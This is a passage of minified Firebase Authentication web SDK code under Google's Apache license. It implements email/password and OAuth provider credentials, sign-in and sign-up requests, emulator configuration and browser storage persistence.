$m(t,e,n,r,i){var s;if(!((s=t._getRecaptchaConfig())===null||s===void 0)&&s.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")){const o=await Ow(t,e,n,n==="getOobCode");return r(t,o)}else return r(t,e).catch(async o=>{if(o.code==="auth/missing-recaptcha-token"){console.log(`${n} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`);const a=await Ow(t,e,n,n==="getOobCode");return r(t,a)}else return Promise.reject(o)})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function sL(t,e){const n=fc(t,"auth");if(n.isInitialized()){const i=n.getImmediate(),s=n.getOptions();if(Mi(s,e??{}))return i;Ln(i,"already-initialized")}return n.initialize({options:e})}function oL(t,e){const n=(e==null?void 0:e.persistence)||[],r=(Array.isArray(n)?n:[n]).map(xr);e!=null&&e.errorMap&&t._updateErrorMap(e.errorMap),t._initializeWithPersistence(r,e==null?void 0:e.popupRedirectResolver)}function aL(t,e,n){const r=js(t);ee(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");const i=!1,s=_b(e),{host:o,port:a}=lL(e),c=a===null?"":`:${a}`,u={url:`${s}//${o}${c}/`},p=Object.freeze({host:o,port:a,protocol:s.replace(":",""),options:Object.freeze({disableWarnings:i})});if(!r._canInitEmulator){ee(r.config.emulator&&r.emulatorConfig,r,"emulator-config-failed"),ee(Mi(u,r.config.emulator)&&Mi(p,r.emulatorConfig),r,"emulator-config-failed");return}r.config.emulator=u,r.emulatorConfig=p,r.settings.appVerificationDisabledForTesting=!0,cL()}function _b(t){const e=t.indexOf(":");return e<0?"":t.substr(0,e+1)}function lL(t){const e=_b(t),n=/(\/\/)?([^?#/]+)/.exec(t.substr(e.length));if(!n)return{host:"",port:null};const r=n[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){const s=i[1];return{host:s,port:Dw(r.substr(s.length+1))}}else{const[s,o]=r.split(":");return{host:s,port:Dw(o)}}}function Dw(t){if(!t)return null;const e=Number(t);return isNaN(e)?null:e}function cL(){function t(){const e=document.createElement("p"),n=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",n.position="fixed",n.width="100%",n.backgroundColor="#ffffff",n.border=".1em solid #000000",n.color="#b50000",n.bottom="0px",n.left="0px",n.margin="0px",n.zIndex="10000",n.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",t):t())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dv{constructor(e,n){this.providerId=e,this.signInMethod=n}toJSON(){return wr("not implemented")}_getIdTokenResponse(e){return wr("not implemented")}_linkToIdToken(e,n){return wr("not implemented")}_getReauthenticationResolver(e){return wr("not implemented")}}async function uL(t,e){return Ji(t,"POST","/v1/accounts:signUp",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function dL(t,e){return gc(t,"POST","/v1/accounts:signInWithPassword",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function hL(t,e){return gc(t,"POST","/v1/accounts:signInWithEmailLink",Xi(t,e))}async function fL(t,e){return gc(t,"POST","/v1/accounts:signInWithEmailLink",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bl extends Dv{constructor(e,n,r,i=null){super("password",r),this._email=e,this._password=n,this._tenantId=i}static _fromEmailAndPassword(e,n){return new Bl(e,n,"password")}static _fromEmailAndCode(e,n,r=null){return new Bl(e,n,"emailLink",r)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e;if(n!=null&&n.email&&(n!=null&&n.password)){if(n.signInMethod==="password")return this._fromEmailAndPassword(n.email,n.password);if(n.signInMethod==="emailLink")return this._fromEmailAndCode(n.email,n.password,n.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":const n={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return $m(e,n,"signInWithPassword",dL);case"emailLink":return hL(e,{email:this._email,oobCode:this._password});default:Ln(e,"internal-error")}}async _linkToIdToken(e,n){switch(this.signInMethod){case"password":const r={idToken:n,returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return $m(e,r,"signUpPassword",uL);case"emailLink":return fL(e,{idToken:n,email:this._email,oobCode:this._password});default:Ln(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function vo(t,e){return gc(t,"POST","/v1/accounts:signInWithIdp",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pL="http://localhost";class bs extends Dv{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const n=new bs(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(n.idToken=e.idToken),e.accessToken&&(n.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(n.nonce=e.nonce),e.pendingToken&&(n.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(n.accessToken=e.oauthToken,n.secret=e.oauthTokenSecret):Ln("argument-error"),n}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e,{providerId:r,signInMethod:i}=n,s=pc(n,["providerId","signInMethod"]);if(!r||!i)return null;const o=new bs(r,i);return o.idToken=s.idToken||void 0,o.accessToken=s.accessToken||void 0,o.secret=s.secret,o.nonce=s.nonce,o.pendingToken=s.pendingToken||null,o}_getIdTokenResponse(e){const n=this.buildRequest();return vo(e,n)}_linkToIdToken(e,n){const r=this.buildRequest();return r.idToken=n,vo(e,r)}_getReauthenticationResolver(e){const n=this.buildRequest();return n.autoCreate=!1,vo(e,n)}buildRequest(){const e={requestUri:pL,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const n={};this.idToken&&(n.id_token=this.idToken),this.accessToken&&(n.access_token=this.accessToken),this.secret&&(n.oauth_token_secret=this.secret),n.providerId=this.providerId,this.nonce&&!this.pendingToken&&(n.nonce=this.nonce),e.postBody=ra(n)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function mL(t){switch(t){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function gL(t){const e=Qa(Xa(t)).link,n=e?Qa(Xa(e)).deep_link_id:null,r=Qa(Xa(t)).deep_link_id;return(r?Qa(Xa(r)).link:null)||r||n||e||t}class jv{constructor(e){var n,r,i,s,o,a;const c=Qa(Xa(e)),u=(n=c.apiKey)!==null&&n!==void 0?n:null,p=(r=c.oobCode)!==null&&r!==void 0?r:null,f=mL((i=c.mode)!==null&&i!==void 0?i:null);ee(u&&p&&f,"argument-error"),this.apiKey=u,this.operation=f,this.code=p,this.continueUrl=(s=c.continueUrl)!==null&&s!==void 0?s:null,this.languageCode=(o=c.languageCode)!==null&&o!==void 0?o:null,this.tenantId=(a=c.tenantId)!==null&&a!==void 0?a:null}static parseLink(e){const n=gL(e);try{return new jv(n)}catch{return null}}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ia{constructor(){this.providerId=ia.PROVIDER_ID}static credential(e,n){return Bl._fromEmailAndPassword(e,n)}static credentialWithLink(e,n){const r=jv.parseLink(n);return ee(r,"argument-error"),Bl._fromEmailAndCode(e,r.code,r.tenantId)}}ia.PROVIDER_ID="password";ia.EMAIL_PASSWORD_SIGN_IN_METHOD="password";ia.EMAIL_LINK_SIGN_IN_METHOD="emailLink";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wb{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vc extends wb{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ri extends vc{constructor(){super("facebook.com")}static credential(e){return bs._fromParams({providerId:ri.PROVIDER_ID,signInMethod:ri.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return ri.credentialFromTaggedObject(e)}static credentialFromError(e){return ri.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return ri.credential(e.oauthAccessToken)}catch{return null}}}ri.FACEBOOK_SIGN_IN_METHOD="facebook.com";ri.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ii extends vc{constructor(){super("google.com"),this.addScope("profile")}static credential(e,n){return bs._fromParams({providerId:ii.PROVIDER_ID,signInMethod:ii.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:n})}static credentialFromResult(e){return ii.credentialFromTaggedObject(e)}static credentialFromError(e){return ii.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:n,oauthAccessToken:r}=e;if(!n&&!r)return null;try{return ii.credential(n,r)}catch{return null}}}ii.GOOGLE_SIGN_IN_METHOD="google.com";ii.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class si extends vc{constructor(){super("github.com")}static credential(e){return bs._fromParams({providerId:si.PROVIDER_ID,signInMethod:si.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return si.credentialFromTaggedObject(e)}static credentialFromError(e){return si.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return si.credential(e.oauthAccessToken)}catch{return null}}}si.GITHUB_SIGN_IN_METHOD="github.com";si.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class oi extends vc{constructor(){super("twitter.com")}static credential(e,n){return bs._fromParams({providerId:oi.PROVIDER_ID,signInMethod:oi.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:n})}static credentialFromResult(e){return oi.credentialFromTaggedObject(e)}static credentialFromError(e){return oi.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:n,oauthTokenSecret:r}=e;if(!n||!r)return null;try{return oi.credential(n,r)}catch{return null}}}oi.TWITTER_SIGN_IN_METHOD="twitter.com";oi.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function vL(t,e){return gc(t,"POST","/v1/accounts:signUp",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ts{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,n,r,i=!1){const s=await kn._fromIdTokenResponse(e,r,i),o=jw(r);return new Ts({user:s,providerId:o,_tokenResponse:r,operationType:n})}static async _forOperation(e,n,r){await e._updateTokensIfNecessary(r,!0);const i=jw(r);return new Ts({user:e,providerId:i,_tokenResponse:r,operationType:n})}}function jw(t){return t.providerId?t.providerId:"phoneNumber"in t?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kd extends sr{constructor(e,n,r,i){var s;super(n.code,n.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,kd.prototype),this.customData={appName:e.name,tenantId:(s=e.tenantId)!==null&&s!==void 0?s:void 0,_serverResponse:n.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,n,r,i){return new kd(e,n,r,i)}}function xb(t,e,n,r){return(e==="reauthenticate"?n._getReauthenticationResolver(t):n._getIdTokenResponse(t)).catch(s=>{throw s.code==="auth/multi-factor-auth-required"?kd._fromErrorAndOperation(t,s,e,r):s})}async function yL(t,e,n=!1){const r=await zl(t,e._linkToIdToken(t.auth,await t.getIdToken()),n);return Ts._forOperation(t,"link",r)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function _L(t,e,n=!1){const{auth:r}=t;if(Ut(r.app))return Promise.reject(Sr(r));const i="reauthenticate";try{const s=await zl(t,xb(r,i,e,t),n);ee(s.idToken,r,"internal-error");const o=Av(s.idToken);ee(o,r,"internal-error");const{sub:a}=o;return ee(t.uid===a,r,"user-mismatch"),Ts._forOperation(t,i,s)}catch(s){throw(s==null?void 0:s.code)==="auth/user-not-found"&&Ln(r,"user-mismatch"),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Eb(t,e,n=!1){if(Ut(t.app))return Promise.reject(Sr(t));const r="signIn",i=await xb(t,r,e),s=await Ts._fromIdTokenResponse(t,r,i);return n||await t._updateCurrentUser(s.user),s}async function wL(t,e){return Eb(js(t),e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Cb(t){const e=js(t);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}async function xL(t,e,n){if(Ut(t.app))return Promise.reject(Sr(t));const r=js(t),o=await $m(r,{returnSecureToken:!0,email:e,password:n,clientType:"CLIENT_TYPE_WEB"},"signUpPassword",vL).catch(c=>{throw c.code==="auth/password-does-not-meet-requirements"&&Cb(t),c}),a=await Ts._fromIdTokenResponse(r,"signIn",o);return await r._updateCurrentUser(a.user),a}function EL(t,e,n){return Ut(t.app)?Promise.reject(Sr(t)):wL(ft(t),ia.credential(e,n)).catch(async r=>{throw r.code==="auth/password-does-not-meet-requirements"&&Cb(t),r})}function CL(t,e,n,r){return ft(t).onIdTokenChanged(e,n,r)}function SL(t,e,n){return ft(t).beforeAuthStateChanged(e,n)}function bL(t,e,n,r){return ft(t).onAuthStateChanged(e,n,r)}function TL(t){return ft(t).signOut()}const Pd="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sb{constructor(e,n){this.storageRetriever=e,this.type=n}_isAvailable(){try{return this.storage?(this.storage.setItem(Pd,"1"),this.storage.removeItem(Pd),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,n){return this.storage.setItem(e,JSON.stringify(n)),Promise.resolve()}_get(e){const n=this.storage.getItem(e);return Promise.resolve(n?JSON.parse(n):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const IL=1e3,NL=10;class bb extends Sb{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,n)=>this.onStorageEvent(e,n),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=mb(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const n of Object.keys(this.listeners)){const r=this.storage.getItem(n),i=this.localCache[n];r!==i&&e(n,i,r)}}onStorageEvent(e,n=!1){if(!e.key){this.forAllChangedKeys((o,a,c)=>{this.notifyListeners(o,c)});return}const r=e.key;n?this.detachListener():this.stopPolling();const i=()=>{const o=this.storage.getItem(r);!n&&this.localCache[r]===o||this.notifyListeners(r,o)},s=this.storage.getItem(r);WM()&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,NL):i()}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n&&JSON.parse(n))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,n,r)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:n,newValue:r}),!0)})},IL)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,n){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,n){await super._set(e,n),this.localCache[e]=JSON.stringify(n)}async _get(e){const n=await super._get(e);return this.localCache[e]=JSON.stringify(n),n}async _remove(e){await super._remove(e),delete this.localCache[e]}}bb.type="LOCAL";const kL=bb;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Tb extends Sb{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,n){}_removeListener(e,n){}}Tb.type="SESSION";const Ib=Tb;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function PL(t){return Promise.all(t.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(n){return{fulfilled:!1,reason:n}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nh{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const n=this.receivers.find(i=>i.isListeningto(e));if(n)return n;const r=new Nh(e);return this.receivers.push(r),r}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const n=e,{eventId:r,eventType:i,data:s}=n.data,o=this.handlersMap[i];if(!(o!=null&&o.size))return;n.ports[0].postMessage({status:"ack",eventId:r,eventType:i});const a=Array.from(o).map(async u=>u(n.origin,s)),c=await PL(a);n.ports[0].postMessage({status:"done",eventId:r,eventType:i,response:c})}_subscribe(e,n){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(n)}_unsubscribe(e,n){this.handlersMap[e]&&n&&this.handlersMap[e].delete(n),(!n||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}Nh.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Mv(t="",e=10){let n="";for(let r=0;r<e;r++)n+=Math.floor(Math.random()*10);return t+n}/**
 * @license
